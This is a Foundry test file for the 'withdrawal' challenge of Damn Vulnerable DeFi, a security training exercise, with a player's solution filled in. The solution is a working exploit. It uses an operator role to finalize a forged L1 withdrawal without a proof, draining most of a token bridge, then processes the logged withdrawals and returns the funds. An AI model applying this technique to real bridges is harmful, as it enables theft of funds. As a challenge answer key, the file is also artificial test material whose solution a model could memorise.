// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /*
    Withdrawal:
        "topics": [
            "0x43738d035e226f1ab25d294703b51025bde812317da73f87d849abbdbb6526f5", // event signature
            "0x0000000000000000000000000000000000000000000000000000000000000000", // nonce
            "0x00000000000000000000000087EAD3e78Ef9E26de92083b75a3b037aC2883E16", // caller
            "0x000000000000000000000000fF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5" // target
        ],
        "data": "
        eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id - 0x20
        0000000000000000000000000000000000000000000000000000000066729b63 // timestamp - 0x40
        0000000000000000000000000000000000000000000000000000000000000060 // data offset - 0x60
        0000000000000000000000000000000000000000000000000000000000000104 // data length - 0x80
        01210a38 // forwardMessage selector - 0x84
        0000000000000000000000000000000000000000000000000000000000000000 // nonce - 0xa4
        000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender - 0xc4
        0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target - 0xe4
        0000000000000000000000000000000000000000000000000000000000000080 // message offset - 0x104 
        0000000000000000000000000000000000000000000000000000000000000044 // message length - 0x124
        81191e51 // executeTokenWithdrawal selector - 0x128
        000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver - 0x148
        0000000000000000000000000000000000000000000000008ac7230489e80000 // amount - 0x168
        0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        "    
    */
    struct Withdrawals {
        bytes data;
        bytes32[] topics;
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        // 4 withdrawals:
        // every withdrawal asks for 10 tokens, except the third one,
        // which asks for 999000
        Withdrawals[] memory withdrawals = abi.decode(
            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/withdrawal/withdrawals.json"))),
            (Withdrawals[])
        );

        // player is operator, no need for the proof
        bytes32[] memory proof;
        bytes memory data = withdrawals[0].data;
        uint256 amountForWithdrawals;
        assembly {
            amountForWithdrawals := mul(3, mload(add(data, 0x168)))
        }

        // empty the bridge, only leave tokens for normal withdrawals
        l1Gateway.finalizeWithdrawal({
            nonce: 0,
            l2Sender: l2Handler,
            target: address(l1Forwarder),
            timestamp: 0,
            message: abi.encodeCall(
                l1Forwarder.forwardMessage,
                (
                    0,
                    address(0),
                    address(l1TokenBridge),
                    abi.encodeCall(
                        l1TokenBridge.executeTokenWithdrawal, (player, INITIAL_BRIDGE_TOKEN_AMOUNT - amountForWithdrawals)
                    )
                )
            ),
            proof: proof
        });

        {
            skip(8 days);
            uint256 nonce;
            uint256 timestamp_;
            address l2Sender;
            address receiver;
            uint256 amount;
            for (uint256 i; i < withdrawals.length; ++i) {
                nonce = uint256(withdrawals[i].topics[1]);
                data = withdrawals[i].data;
                assembly {
                    timestamp_ := mload(add(data, 0x40))
                    l2Sender := mload(add(data, 0xc4))
                    receiver := mload(add(data, 0x148))
                    amount := mload(add(data, 0x168))
                }
                //console.log(amount / 1 ether);
                l1Gateway.finalizeWithdrawal({
                    nonce: nonce,
                    l2Sender: l2Handler,
                    target: address(l1Forwarder),
                    timestamp: timestamp_,
                    message: abi.encodeCall(
                        l1Forwarder.forwardMessage,
                        (
                            nonce,
                            l2Sender,
                            address(l1TokenBridge),
                            abi.encodeCall(l1TokenBridge.executeTokenWithdrawal, (receiver, amount))
                        )
                    ),
                    proof: proof
                });
            }
        }

        token.transfer(address(l1TokenBridge), token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }
}
